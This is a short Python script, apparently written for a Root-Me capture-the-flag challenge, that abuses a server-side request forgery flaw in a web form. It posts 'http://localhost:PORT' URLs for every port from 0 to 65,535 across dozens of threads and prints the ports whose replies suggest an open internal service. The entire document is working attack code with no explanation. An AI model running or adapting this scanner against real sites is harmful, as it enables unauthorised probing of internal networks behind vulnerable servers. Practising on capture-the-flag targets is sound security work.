import requests
import threading
from time import time
url='http://ctf01.root-me.org/index.php'
a=[]
def scan(a,b):
        for i in range(a,b):
                try:
                        r=requests.post(url,data={'url':'http://localhost:'+str(i)})
                        if 'Connection refused' not in r.content:
                                print(i)
                except:
                        pass
if __name__ == '__main__':
        try:
                x=time()
                for i in range(65):
                        t=threading.Thread(target=scan,args=(i*1000,(i+1)*1000))
                        t.daemon=True
                        a.append(t)
                        t.start()
                t=threading.Thread(target=scan,args=(65000,65535))
                t.daemon=True
                t.start()
                a.append(t)
                for i in a:
                        i.join()
                print('OK')
                print( time()-x)
        except:
                exit(0)